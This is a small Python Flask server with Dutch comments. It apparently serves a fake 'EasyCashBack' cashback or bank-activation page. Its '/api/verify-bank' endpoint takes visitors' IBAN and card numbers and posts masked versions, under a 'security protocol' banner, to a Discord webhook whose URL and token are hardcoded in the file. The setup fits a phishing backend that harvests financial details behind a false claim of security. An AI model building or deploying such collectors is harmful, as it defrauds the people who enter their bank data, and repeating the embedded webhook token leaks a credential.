import os
import requests
from flask import Flask, render_template, request, jsonify

# De variabele 'app' moet exact zo heten voor Gunicorn op Render
app = Flask(__name__)

# Webhook URL uit de instellingen of je backup link
DISCORD_URL = os.environ.get(
    "DISCORD_WEBHOOK", 
    "https://discord.com/api/webhooks/1491401500428079174/6sKKzOPurbFR-X557CPYUDXgRATDio87eg0GWwUMVFZkopS5D4VW7oJegJeUhM_B1Ir5"
)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/verify-bank', methods=['POST'])
def verify_bank():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400
            
        # Gegevens ophalen en omzetten naar tekst
        iban = str(data.get('iban', 'Onbekend'))
        card = str(data.get('card', 'Onbekend'))
        
        # Simpele privacy masking zonder f-strings in de dict
        m_iban = iban[:4] + " **** " + iban[-2:] if len(iban) > 8 else "****"
        m_card = "**** **** " + card[-3:] if len(card) > 3 else "****"

        # Bericht opbouwen
        payload = {
            "embeds": [{
                "title": "🔒 Beveiligde Activatie",
                "description": "Nieuwe bankkoppeling via de Hub.",
                "color": 3447003,
                "fields": [
                    {"name": "IBAN (Gezensureerd)", "value": m_iban, "inline": False},
                    {"name": "Kaart ID", "value": m_card, "inline": True}
                ],
                "footer": {"text": "EasyCashBack Security Protocol"}
            }]
        }
        
        # Versturen naar Discord
        requests.post(DISCORD_URL, json=payload, timeout=10)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        print("Fout:", str(e))
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
